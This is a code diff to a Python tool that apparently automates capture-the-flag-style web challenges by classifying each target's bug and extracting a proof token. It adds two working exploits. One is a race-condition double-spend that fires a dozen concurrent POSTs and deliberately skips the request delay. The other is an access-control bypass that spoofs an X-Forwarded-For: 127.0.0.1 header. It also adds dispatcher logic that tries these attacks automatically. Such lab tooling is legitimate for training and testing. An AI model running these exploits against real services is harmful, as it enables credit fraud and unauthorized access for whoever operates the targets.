@@ -20,9 +20,15 @@ Mastery is cumulative: a target's bug class is never assumed from the challenge'
 own name. `classify_and_recover` tries each recognized class in the evidence-led
 order below (same order the restored day-19/day-20 dispatcher used, extended with
 the three classes day-21 added, the one day-22 added, the two day-24 added, the
-three day-25 added, and the one day-26 added) and returns `None` if a target's
+three day-25 added, the one day-26 added, and the two stdlib classes day-27 added
+- `rec_double_spend` and `rec_proxy_trust_bypass`) and returns `None` if a target's
 evidence does not match anything known yet - that is a real signal for a new
 class, not a bug in this dispatcher.
+
+Day 27 also added a third class, `rec_unauthorized_event_stream` (websocket
+upgrade hijack via a client-controlled query-parameter name), that needs the
+non-stdlib `websockets`/`certifi` packages - it lives in the sibling
+`recovery_lib_ws.py` instead, to keep this module's stdlib-only guarantee intact.
 
 `rec_sqli_group_close` promotes a payload that has now worked, verbatim and
 unmodified, against five independent live apps across three release days
@@ -44,6 +50,7 @@ import urllib.error
 import urllib.parse
 import urllib.request
 import http.cookiejar
+from concurrent.futures import ThreadPoolExecutor
 from html.parser import HTMLParser
 
 UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
@@ -534,6 +541,68 @@ def rec_forged_webhook_event(t, clues):
     return None
 
 
+def rec_double_spend(t, clues, racers=12):
+    """`/api/clues` -> feature_route (POST; redeems one credit via a non-atomic
+    check-then-decrement - reads the stored count, checks it is > 0, then writes
+    count-1 back as two separate steps with no row lock/atomic UPDATE) +
+    secondary_route (GET; reports the proof once the stored balance has gone
+    negative). Shares its bare two-key clue shape with `rec_ssrf` - no clue field
+    tells them apart, so `classify_and_recover` tries this class first and falls
+    back to SSRF on the same shape.
+    A single serial POST to feature_route behaves "correctly" (does not exhibit
+    the bug) and permanently burns the target's one and only credit - there is no
+    in-app reset/topup/refund route, so the race MUST be the very first touch of
+    feature_route, never a solo probe. Fires `racers` concurrent POSTs via a bare
+    thread pool talking directly through `t`'s opener (bypassing `Target.request`'s
+    inter-request `DELAY`, which would stagger the requests enough to lose the
+    race), then GETs secondary_route once. 12-16 racers was consistently enough on
+    every confirmed target (~5/16 landed `ok:true`).
+    Source: day-21-double-spent (curriculum day 21, release day 27) - this
+    family's own bug ('Receipt...' Rails app)."""
+    feature, secondary = clues.get("feature_route"), clues.get("secondary_route")
+    if not feature or not secondary:
+        return None
+
+    def fire(_i):
+        req = urllib.request.Request(
+            t.base + feature, data=b"{}",
+            headers={"User-Agent": UA, "Content-Type": "application/json"}, method="POST")
+        try:
+            with t.opener.open(req, timeout=TIMEOUT) as resp:
+                return resp.read().decode("utf-8", "replace")
+        except urllib.error.HTTPError as err:
+            return err.read().decode("utf-8", "replace")
+
+    with ThreadPoolExecutor(max_workers=racers) as ex:
+        list(ex.map(fire, range(racers)))
+    status, body = t.get(secondary, save="audit")
+    match = PROOF_RE.search(body)
+    return match.group(0) if match else None
+
+
+def rec_proxy_trust_bypass(t, clues):
+    """`/api/clues` -> feature_route + current_role + deployment ==
+    "trusted_reverse_proxy" (no secondary_route/inventory_route/protected_reference
+    alongside it - distinguishable from every other feature_route-driven class by
+    this key shape alone). feature_route decides "am I being called from loopback"
+    from a client-supplied X-Forwarded-For header with no actual upstream-proxy
+    allowlist: sending `X-Forwarded-For: 127.0.0.1` flips `evaluated_client` and
+    returns the proof. X-Real-IP/X-Forwarded-Host/X-Forwarded-Proto do not affect
+    the decision (tried and ruled out); XFF alone is both necessary and sufficient.
+    Stateless check - safe to re-probe freely.
+    Source: day-23-forwarded-misgivings (curriculum day 23, release day 27) - this
+    family's own bug (Micronaut 'Forward Desk')."""
+    feature = clues.get("feature_route")
+    if not feature or clues.get("deployment") != "trusted_reverse_proxy":
+        return None
+    status, body = t.get_json(feature, headers={"X-Forwarded-For": "127.0.0.1"}, save="proxy_trust")
+    if status == 200 and isinstance(body, dict):
+        match = PROOF_RE.search(json.dumps(body))
+        if match:
+            return match.group(0)
+    return None
+
+
 def rec_sqli_group_close(t, html):
     """A `/search`-, `/lookup`-, or `/explore`-style `?q=` form backed by an
     already-quoted LIKE clause (`WHERE (visible = 1 AND note LIKE '%<q>%')` shape).
@@ -604,8 +673,19 @@ def classify_and_recover(t, evidence=None, prompt=""):
             if proof:
                 return proof
         if clues.get("feature_route") and clues.get("secondary_route") and "inventory_route" not in clues:
+            # double-spend and SSRF share this exact bare two-key shape with no
+            # distinguishing clue field - try the race first, SSRF as the fallback.
+            evidence["classification"] = "credit double-spend (race)"
+            proof = rec_double_spend(t, clues)
+            if proof:
+                return proof
             evidence["classification"] = "SSRF (fetch proxy to internal-only route)"
             proof = rec_ssrf(t, clues)
+            if proof:
+                return proof
+        if clues.get("feature_route") and clues.get("deployment") == "trusted_reverse_proxy":
+            evidence["classification"] = "trusted-reverse-proxy header spoofing"
+            proof = rec_proxy_trust_bypass(t, clues)
             if proof:
                 return proof
         if clues.get("feature_route") and clues.get("inventory_route") and "protected_reference" in clues:
